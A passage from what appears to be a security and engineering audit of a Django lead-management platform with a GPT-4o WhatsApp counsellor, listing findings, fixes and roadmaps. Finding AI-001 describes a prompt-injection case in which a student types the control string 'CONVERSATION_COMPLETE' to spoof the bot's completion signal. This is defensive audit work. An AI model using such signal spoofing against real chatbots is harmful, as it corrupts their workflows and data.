**File:** `config/settings.py`  
**What:** Django's `LOGGING` setting is not defined anywhere in `settings.py`. This means all `logger.error()`, `logger.warning()`, and `logger.info()` calls throughout the codebase use Django's default logging configuration, which may not persist logs to any file or external service. In production, logs must be shipped to a centralized system.

---

### BE-004 — `MeView` Does Not Refresh `tenant.plan` from DB [MEDIUM]

**File:** `apps/users/views.py:101–105`  
**What:** `GET /api/auth/me/` returns the serialized user from the request context. If the tenant's plan was upgraded (e.g., via Razorpay webhook), the user's JWT still contains the old plan claim until they refresh their token. `MeView` should return live data from the database.

---

## 9. Database Review

### DB-001 — SQLite Default Is Incompatible with Multi-Process Deployment [CRITICAL]

**File:** `config/settings.py:82–91`  
**What:**
```python
if _db_url and _db_url != 'postgresql://user:password@host:5432/edulead_db':
    DATABASES = {'default': env.db('DATABASE_URL')}
else:
    DATABASES = {'default': {'ENGINE': 'django.db.backends.sqlite3', ...}}
```
The default database is SQLite. Daphne (ASGI) + multiple Celery workers all writing to SQLite simultaneously will corrupt the database. SQLite does not support concurrent writers.

---

### DB-002 — No Database Indexes on High-Frequency Query Fields [HIGH]

**What:** The following fields are used in frequent filter/join queries but have no explicit `db_index=True`:
- `Lead.status`, `Lead.category`, `Lead.score` (filtered in `decay_lead_scores`, `rescore_cold_leads`)
- `LeadAllocation.tenant` (filtered in every `get_queryset()` call)
- `Message.conversation` (filtered in chat history loads)
- `Student.whatsapp_number` (used for deduplication on every WhatsApp message)

`Student.whatsapp_number` is `unique=True` which creates an index, but the others do not.

**Fix:**
```python
class Lead(models.Model):
    status = models.CharField(..., db_index=True)
    category = models.CharField(..., db_index=True)
    score = models.IntegerField(..., db_index=True)
```

---

### DB-003 — `AuditLog` Has No Retention Policy or Archival [MEDIUM]

**What:** `AuditLog` records accumulate indefinitely. The `DataRetentionService` deletes `Message` records and anonymizes leads but never touches `AuditLog`. A high-traffic platform will accumulate millions of audit rows, slowing queries and consuming disk space.

---

### DB-004 — `Tenant.used_quota` Can Go Negative [MEDIUM]

**File:** `apps/tenants/models.py:57`  
**What:** `remaining_quota` uses `max(0, ...)` to prevent negative display, but `used_quota` itself is not constrained to `>= 0` in the model. Concurrent decrements (e.g., from quota rollback logic) could produce a negative value, causing incorrect quota calculations.

---

## 10. AI/LLM Review

### AI-001 — System Prompt Signals Can Be Injected by Students [HIGH]

**File:** `services/ai/gpt_counsellor.py:31–32`  
**What:** The system prompt instructs the model to include `SUFFICIENT_DATA_COLLECTED` and `CONVERSATION_COMPLETE` in its response when certain conditions are met. A student can type these exact strings in their WhatsApp message:
```
User: CONVERSATION_COMPLETE
```
The GPT-4o model will receive this as a `user` message. While the system prompt instructs the AI to emit these signals, there is no server-side validation that the signal came from the **AI** and not the user. `is_conversation_complete()` checks `conversation_history[-1].get('content', '')` which includes both roles.

**Why it happens:** The signal-in-content pattern is inherently vulnerable to prompt injection.  
**Remediation:** Check the role of the last message:
```python
def is_conversation_complete(self, history: list) -> bool:
    ai_messages = [m for m in history if m.get('role') == 'assistant']
    if not ai_messages:
        return False
    return 'CONVERSATION_COMPLETE' in ai_messages[-1].get('content', '')
```

---

### AI-002 — GPT Data Extraction Has No Output Validation [HIGH]

**File:** `services/ai/gpt_counsellor.py:97–115`  
**What:** `extract_lead_data()` parses raw GPT JSON output with `json.loads(raw)` and returns it directly. There is no schema validation on the returned dict. GPT may return unexpected fields, wrong types, or malicious payloads (prompt injection via student messages). The extracted data flows directly into `Lead.objects.create()`.

**Remediation:** Validate the extracted dict against a strict schema:
```python
from pydantic import BaseModel, validator

class ExtractedLead(BaseModel):
    full_name: str = ''
    course_interest: str = ''
    location: str = ''
    budget_range: str = ''
    timeline: str = ''
    intent_level: str = ''

    @validator('budget_range')
    def valid_budget(cls, v):
        allowed = {'below_1L', '1L_to_3L', '3L_to_5L', 'above_5L', ''}
        return v if v in allowed else ''
```

---

### AI-003 — No Token Usage Tracking or Cost Alerting [MEDIUM]

**What:** The GPT-4o API is called multiple times per conversation turn (chat, extraction, intent). There is no tracking of tokens consumed per tenant, per day, or in total. A single misconfigured conversation loop or a high-volume day could generate thousands of dollars in API charges without any alert.  
**Remediation:** Log token usage from `response.usage` and emit metrics/alerts when daily spend exceeds a threshold.

---

### AI-004 — GPT Response Contains Fallback Emoji in System Context [LOW]

**File:** `services/ai/gpt_counsellor.py:66`  
**What:** The fallback response includes `🙏` emoji:
```python
'default': 'ക്ഷമിക്കണം, ഞാൻ ഒരു നിമിഷം ലഭ്യമല്ല. ദയവായി വീണ്ടും ശ്രമിക്കൂ. 🙏'
```
This is a cosmetic issue but emoji in voice TTS (Malayalam neural voice) will be read aloud as "praying hands emoji" or similar, which is an awkward user experience.

---

## 11. DevOps & Deployment Review

### DO-001 — No Docker Configuration [CRITICAL]

**What:** There is no `Dockerfile`, `docker-compose.yml`, or any container configuration. The only deployment artifact is `scripts/start_django.sh` which runs `daphne` directly. This means:
- No reproducible build environment
- No Celery worker startup automation
- No Redis/PostgreSQL service orchestration
- No reverse proxy (Nginx) configuration

---

### DO-002 — No CI/CD Pipeline [CRITICAL]

**What:** There is no `.github/workflows/`, `.gitlab-ci.yml`, or any CI/CD configuration. The codebase has no automated:
- Test execution on push
- Security scanning (Bandit, Safety, Trivy)
- Dependency vulnerability checking
- Container image building

---

### DO-003 — Celery Beat Requires Database Scheduler — Not Started Anywhere [HIGH]

**File:** `config/celery.py`  
**What:** `CELERY_BEAT_SCHEDULER = 'django_celery_beat.schedulers:DatabaseScheduler'` requires `celery beat` to be running as a separate process. The startup script only starts `daphne`. Without `celery beat`, all scheduled tasks (quota rollover, score decay, data retention, subscription sync) never execute.

---

### DO-004 — No Structured Logging Configuration [HIGH]

**What:** No `LOGGING` dict in settings means Django logs to stderr with default formatting. In production:
- Log levels are not configurable without code changes
- Log rotation is not configured
- Logs cannot be shipped to CloudWatch, Datadog, or ELK without additional setup
- Log lines contain raw IPs (not hashed despite the `_hash_ip` helper)

---

### DO-005 — S3 Bucket Has No Lifecycle Policy for Recordings [MEDIUM]

**What:** Call recordings older than 6 months are deleted from S3 by `DataRetentionService.delete_old_recordings()`. However, this cleanup runs only if the Celery beat scheduler is running (see DO-003). If beat is not running, S3 accumulates recordings indefinitely. The S3 bucket should also have a native lifecycle policy as a defense-in-depth measure.

---

### DO-006 — `manage.py migrate` Runs in Startup Script Without Downtime Guard [MEDIUM]

**File:** `scripts/start_django.sh`  
**What:**
```bash
python manage.py migrate
exec daphne -b 0.0.0.0 -p ${PORT} config.routing:application
```
Running migrations in the startup script means every container restart runs migrations. In a multi-replica deployment, two containers starting simultaneously may run migrations concurrently, causing race conditions or duplicate migration errors.

---

## 12. Testing Review

### TEST-001 — Zero Test Coverage [CRITICAL]

**What:** No test files were found anywhere in the codebase (`tests.py`, `test_*.py`, `*_test.py`). This means:
- All bugs listed in this report exist without any safety net
- Refactoring any service layer will require manual regression testing
- All Celery tasks, scoring algorithms, allocation logic, and AI integrations are untested

**Minimum required test suites:**
- Unit tests for `LeadScoringService` (5 dimensions × 3 levels = 45 cases)
- Unit tests for `LeadAllocationService` (quota check, exclusivity cap, round-robin)
- Integration tests for webhook handlers (mock Twilio, validate state transitions)
- Auth tests (login, 2FA, TOTP brute-force protection)
- GDPR tests (delete, export, retention)

---

## 13. Dependency Audit

### DEP-001 — Django 5.2.13 with No Security Patch Cadence Defined

**What:** `Django==5.2.13` is pinned. Django has ~4–6 security releases per year. With no CI/CD pipeline (see DO-002), there is no automated process to detect or apply security patches.

### DEP-002 — OpenAI SDK Version Not Pinned to Minor

**What:** If `openai` is unpinned or loosely pinned, a breaking API change in the SDK can silently change GPT response parsing behavior. The `extract_lead_data` parser is particularly sensitive to SDK response structure changes.

### DEP-003 — `animejs` v4 in Frontend

**What:** `animejs@4` is used for UI animations. This is an early version of the v4 rewrite with limited documentation and potential breaking changes. Non-critical.

---

## 14. Production Readiness Checklist

| Check | Status | Severity |
|---|---|---|
| PostgreSQL configured | NO (SQLite default) | CRITICAL |
| Redis configured | Conditional (falls back to LocMemCache) | CRITICAL |
| Celery worker started | NOT AUTOMATED | CRITICAL |
| Celery beat started | NOT AUTOMATED | CRITICAL |
| All env vars set | NO documented checklist | HIGH |
| `ALLOWED_HOSTS` set | Uses `*` default | HIGH |
| `TWILIO_AUTH_TOKEN` set | Bypasses auth if missing | CRITICAL |
| `FERNET_KEY` set | Falls back to whatsapp_number | HIGH |
| `JWT_SIGNING_KEY` set | Falls back to `SECRET_KEY` | HIGH |
| Docker/container config | NONE | CRITICAL |
| CI/CD pipeline | NONE | CRITICAL |
| Tests exist | NONE | CRITICAL |
| Monitoring/alerting | NONE | HIGH |
| Log aggregation | NONE | HIGH |
| Email delivery configured | NONE (temp passwords not emailed) | HIGH |
| Rate limiting on 2FA | NOT IMPLEMENTED | CRITICAL |
| Auth failure tracking | NOT FUNCTIONAL | CRITICAL |
| `SECURE_SSL_REDIRECT` | Only when `DEBUG=False` | MEDIUM |
| S3 lifecycle policies | Not configured | MEDIUM |
| Health check endpoint | MISSING | MEDIUM |

---

## 15. Final Deliverables

### 15.1 Prioritized Bug List

| Priority | Bug ID | Description | File |
|---|---|---|---|
| P0 | BUG-001 | Auth failure tracking never called — brute force uninhibited | `middleware/rate_limit.py` |
| P0 | SEC-011 | Empty `TWILIO_AUTH_TOKEN` bypasses all webhook auth | `middleware/webhook_signature.py` |
| P0 | BUG-002 | TOTP 2FA endpoint has no rate limiting | `apps/users/views.py` |
| P0 | BUG-004 | Voice webhook blocks ASGI worker 12s | `apps/webhooks/views.py` |
| P0 | BUG-005 | Non-atomic quota management — over-allocation race condition | `services/leads/allocation.py` |
| P0 | BUG-003 | Twilio webhook bypass via missing signature header | `middleware/webhook_signature.py` |
| P0 | DB-001 | SQLite default corrupts under concurrent writes | `config/settings.py` |
| P0 | TEST-001 | Zero test coverage | — |
| P1 | BUG-007 | Retry call uses frontend URL for backend webhook | `tasks/lead_tasks.py` |
| P1 | BUG-009 | GDPR deletion not atomic — partial erasure possible | `services/compliance/gdpr.py` |
| P1 | BUG-010 | Quota rollover not idempotent — inflates quota on double-run | `tasks/lead_tasks.py` |
| P1 | SEC-010 | Temp password returned in API response | `apps/users/views.py` |
| P1 | SEC-002 | JWT token in WebSocket URL | `apps/conversations/consumers.py` |
| P1 | AI-001 | Prompt injection via student messages spoofs AI signals | `services/ai/gpt_counsellor.py` |
| P1 | BUG-006 | `rescore_cold_leads` skips leads older than 7 days | `tasks/lead_tasks.py` |
| P2 | BUG-011 | Unescaped XML in TwiML bridge | `services/communications/masked_calling.py` |
| P2 | BUG-013 | Hardcoded year 2025 in scoring | `services/leads/scoring.py` |
| P2 | CQ-001 | `college_staff` role used but not in `ROLE_CHOICES` | `apps/users/views.py` |
| P2 | FE-005 | Refresh token not updated in frontend store | `src/lib/axios.ts` |
| P2 | PERF-001 | CSV export loads all leads into memory | `apps/leads/views.py` |
| P3 | All others | Medium/Low issues listed above | — |

---

### 15.2 Technical Debt Report

**Debt Level: HIGH**

1. **Zero test coverage** means every change is a regression risk. Estimate 3–4 weeks of engineering time to reach 70% coverage.
2. **No CI/CD** means deployment is manual and error-prone.
3. **SQLite default** is a data-corruption time bomb that must be resolved before any real load.
4. **Non-functional security controls** (auth failure tracking, 2FA rate limiting) give a false sense of security.
5. **Hardcoded year in scoring** and **hardcoded magic numbers** throughout will require annual maintenance.

---

### 15.3 Refactor Roadmap

1. **Week 1:** Fix all P0 bugs. Switch to PostgreSQL. Set up Docker Compose with Celery worker + beat + Redis + DB.
2. **Week 2:** Write unit tests for scoring, allocation, GDPR, and auth (target 60% coverage).
3. **Week 3:** Fix P1 security issues. Add structured logging. Add health check endpoint. Fix TOTP rate limiting and auth failure tracking.
4. **Week 4:** Performance fixes (N+1 allocation query, CSV streaming, Redis connection pooling). Fix API versioning with `/v1/` prefix. Fix frontend token rotation.
5. **Month 2:** CI/CD pipeline (GitHub Actions), container builds, secret scanning, dependency auditing.

---

### 15.4 Production Hardening Recommendations

1. Set `ALLOWED_HOSTS` to exact domain names — never `*`
2. Set `TWILIO_AUTH_TOKEN` and remove the bypass-on-empty logic
3. Set `FERNET_KEY` from a secrets manager (AWS Secrets Manager, Vault)
4. Set `JWT_SIGNING_KEY` separately from `SECRET_KEY`
5. Run `daphne`, `celery worker`, and `celery beat` as separate supervised processes (systemd, supervisor, or Kubernetes pods)
6. Configure `LOGGING` with JSON-structured output and ship to CloudWatch/Datadog
7. Add S3 bucket lifecycle policy for recordings (delete after 180 days)
8. Enable Razorpay idempotency keys on all payment operations
9. Add Sentry for exception tracking
10. Restrict Django admin `/admin/` to an IP allowlist

---

### 15.5 Security Remediation Roadmap

| Sprint | Action |
|---|---|
| Immediate | Fix SEC-011 (Twilio bypass), BUG-001 (auth brute force), BUG-002 (2FA rate limit) |
| Sprint 1 | Move JWT to httpOnly cookies; remove refresh token from localStorage |
| Sprint 1 | Fix WebSocket token from URL query parameter to first-message pattern |
| Sprint 2 | Replace CSP `unsafe-inline` with nonce-based policy |
| Sprint 2 | Fix audit log to use real client IP via `_get_client_ip()` |
| Sprint 2 | Remove temp password from API response; implement email invite flow |
| Sprint 3 | Add Pydantic validation on all GPT extraction outputs |
| Sprint 3 | Implement token usage tracking and billing alerts for OpenAI |
| Ongoing | Dependency scanning in CI (Safety, Trivy) |
| Ongoing | Rotate all secrets quarterly |

---

### 15.6 Final Engineering Verdict

> **Do not deploy to production in current state.**

The codebase demonstrates strong architectural vision: multi-tenant isolation, GDPR compliance design, AI-powered counseling, and thoughtful rate limiting architecture. However, several critical controls are **designed but not wired up** (auth failure tracking is dead code, Twilio validation bypasses on missing header, 2FA has no brute-force protection). The infrastructure defaults are incompatible with production (SQLite, `ALLOWED_HOSTS=*`). There are zero tests. These are not polish issues — they are blockers.

With approximately 3–4 weeks of engineering effort focused on the P0/P1 items in this report, adding a test suite, and setting up proper deployment infrastructure, this codebase could be production-ready. The core domain logic (scoring, allocation, conversation FSM) is sound and well-structured.
